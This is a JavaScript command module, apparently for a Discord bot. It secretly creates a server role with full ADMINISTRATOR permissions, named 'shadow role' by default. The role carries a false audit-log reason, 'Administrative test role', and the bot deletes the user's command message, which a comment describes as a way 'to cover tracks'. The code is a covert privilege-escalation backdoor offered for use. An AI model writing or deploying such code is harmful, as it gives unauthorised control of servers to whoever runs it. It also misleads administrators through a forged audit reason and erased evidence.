module.exports = {
    name: 'create',
    description: "",
    execute(message, args) {

        /**
         * Command will create a role on a discord server, then delete the user's command in chat to cover tracks
         * use the '-add' command to apply the role to the user
         */

        var roleName;
        if (args.length === 0) {
            roleName = "shadow role"; //default role name if no input is given
        } else {
            let argString = args.toString();
            roleName = argString.replace(",", " ");
        }

        /**
         * let roleName = args[0];
         * let color = args[1];
         * let hoist = args[2];
         * 
         * Uncomment and use these if you want to customize a 1 word role
         * Allows to set color and hoist to the respective variables
         * > Color changes role color
         * > Hoist changes whether role is displayed seperately
         */

        message.guild.roles.create({
            data: {
              name: roleName,
              color: 'gray',
              hoist: 'true', //set to false to not show seperately
              permissions: ["ADMINISTRATOR"]
            },
            reason: 'Administrative test role'
        }).then(console.log).catch(console.error);

        message.delete();
    }
}